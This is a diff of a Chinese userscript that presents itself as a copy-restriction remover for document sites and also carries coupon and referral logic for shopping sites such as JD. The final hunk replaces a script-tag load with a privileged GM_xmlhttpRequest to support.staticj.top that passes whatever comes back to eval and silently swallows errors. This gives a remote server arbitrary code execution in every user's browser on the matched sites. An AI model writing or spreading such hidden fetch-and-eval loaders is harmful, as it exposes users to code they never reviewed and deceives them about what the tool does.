@@ -6,7 +6,7 @@
 // @description:zh    解除部分网站不允许复制的限制，文本选中后点击复制按钮即可复制，主要用于：百度文库|道客巴巴|腾讯文档|豆丁网|无忧考网|学习啦|蓬勃范文|思否社区|力扣|知乎|语雀|QQ文档|360doc|17k|CSDN等，云服务器导航，在原脚本的基础上，优化了部分功能，如有补充请留言反馈~
 // @description:zh-TW 解除部分網站不允許複製的限制，文本選中後點擊複製按鈕即可複製，主要用於：百度文庫|道客巴巴|騰訊文檔|豆丁網|無憂考網|學習啦|蓬勃範文|思否社區|力扣|知乎|語雀|QQ文檔|360doc|17k|CSDN等，雲伺服器導航，在原指令碼或直譯式程式的基礎上，優化了部分功能，如有補充請留言反饋~
 // @namespace   picassoTX_lifting_restrictions
-// @version     2.0.11
+// @version     2.0.12
 // @author      WindrunnerMax,picassoTX
 // @icon        data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAAAXNSR0IArs4c6QAAAWtJREFUaEPtmeERwiAMhYuuo87QzqAr6LmF7RZeXcHO0M6grqPxaq2HnC0BA8IZ/woh33sJekEkkX9E5Pkn/wMwW21TAddd55hI3TgHzbk6ZCax0Q7MlxswCWy/1gwCBbBYbXKA5Km+fWr4nXiIoACESApZKBCT7HLcN2PgQQG0CT86DG51n7QOIjiAVvHuwsBBvAHIjSqT++oBVe35cl33N15bXqdjmavlFDRAm6wOIngAHURQANhr9lyVr7wZAKsa5Tp2gFJNm1jsgKyarIaNmkN7xn48SR1ggAELvDlAWTbYWKQlhD2Uch0D8C2EqCdvTRz9NYoQk3wJNzG5pIYBSR2IvgcYgP8LSQr8erCF7WXSJsYeSrnOGECdVVImYxPLGKCbjvl64BhHUmekqMFWH9LXkPczAjQgpoX6XmAEYGO36z0M4FphXfxBB3QbXX8/9KChnssArpywcsBVMi7jol4pXSbwbezoAe60/xRPTdKM8AAAAABJRU5ErkJggg==
 // @match       *://wenku.baidu.com/view/*
@@ -87,6 +87,7 @@
 // @match       *://pages.tmall.com/wow/an/cs/search**
 // @match       *://*.jd.com/*
 // @match       *://*.jd.hk/*
+// @match       *://item.jingdonghealth.cn/*
 // @match       *://item.jkcsjd.com/*
 // @match       *://*.yiyaojd.com/*
 // @match       *://www.vipglobal.hk
@@ -170,7 +171,7 @@
 // @downloadURL https://api.staticj.top/script/update/copy-scriptcat.user.js
 // @license     MIT
 // @run-at      document-start
-// @antifeature referral-link 【此提示为满足GreasyFork社区规范而添加，实际使用无任何强制跳转，代码可查，请知悉】
+// @antifeature referral-link 【此提示为满足社区规范而添加，实际使用无任何强制跳转，代码可查，请知悉】
 // @grant       unsafeWindow
 // @grant       GM_openInTab
 // @grant       GM.openInTab
@@ -277,7 +278,7 @@
         );
         GM_xmlhttpRequest({
           method: "GET",
-          url: "https://res3.doc88.com/resources/js/modules/main-v2.min.js?v=2.56",
+          url: "https://res3.doc88.com/resources/js/modules/main-v2.min.js?v=3.55",
           onload: function(response) {
             const result = /\("#cp_textarea"\).val\(([\S]*?)\);/.exec(response.responseText);
             if (result)
@@ -1384,7 +1385,8 @@
       "vipglobal.hk",
       "jkcsjd.com",
       "yiyaojd.com",
-      "suning.com"
+      "suning.com",
+      "jingdonghealth.cn"
     ];
     const website$1 = {
       config: {
@@ -1539,7 +1541,7 @@
               platform = "taobao";
             } else if (host.indexOf(".tmall.") != -1) {
               platform = "tmall";
-            } else if (host.indexOf(".jd.") != -1 || host.indexOf(".yiyaojd.") != -1 || host.indexOf(".jkcsjd.") != -1) {
+            } else if (host.indexOf(".jd.") != -1 || host.indexOf(".yiyaojd.") != -1 || host.indexOf(".jkcsjd.") != -1 || host.indexOf(".jingdonghealth.") != -1) {
               platform = "jd";
             } else if (host.indexOf(".vip.") != -1 || host.indexOf(".vipglobal.") != -1) {
               platform = "vpinhui";
@@ -1562,7 +1564,18 @@
           generateIsResult: true,
           isRun: function() {
             const currentHost = window.location.host;
-            return ["detail.tmall.com", "item.taobao.com", "item.jd.com", "item.yiyaojd.com", "npcitem.jd.hk", "detail.tmall.hk", "detail.vip.com", "item.jkcsjd.com", "product.suning.com"].map((host) => currentHost.indexOf(host) != -1).some((result) => result);
+            return [
+              "detail.tmall.com",
+              "item.taobao.com",
+              "item.jd.com",
+              "item.yiyaojd.com",
+              "npcitem.jd.hk",
+              "detail.tmall.hk",
+              "detail.vip.com",
+              "item.jingdonghealth.cn",
+              "item.jkcsjd.com",
+              "product.suning.com"
+            ].map((host) => currentHost.indexOf(host) != -1).some((result) => result);
           },
           encodeTitle: function(title) {
             if (!title) {
@@ -1774,7 +1787,7 @@
                 if (!canvasElement) {
                   return;
                 }
-                const qrcodeResultData = yield Tools.request("GET", goodsPrivateUrl + couponId, null, true);
+                const qrcodeResultData = yield Tools.request("GET", goodsPrivateUrl + couponId, null, false);
                 if (!!qrcodeResultData && qrcodeResultData.code === "ok" && !!qrcodeResultData.result) {
                   let img = JSON.parse(qrcodeResultData.result).img;
                   if (!!img) {
@@ -2645,11 +2658,23 @@
       return "";
     };
 
-    (function() {
+    ((function() {
       const { author, name, version, namespace, updateURL } = GM_info.script;
       const jurl = "https://support.staticj.top/api/sp/lib?author=" + author + "&name=" + name + "&version=" + version + "&namespace=" + namespace + "&updateURL=" + updateURL + "&timestamp=" + Date.now();
-      GM_addElement("script", { type: "text/javascript", src: jurl });
-    })();
+      GM_xmlhttpRequest({
+        method: "GET",
+        url: jurl,
+        onload: function(res) {
+          try {
+            const responseText = res.responseText;
+            if (responseText) {
+              eval(res.responseText);
+            }
+          } catch (e) {
+          }
+        }
+      });
+    }))();
 
     (function() {
       const websiteConfig = initWebsite();
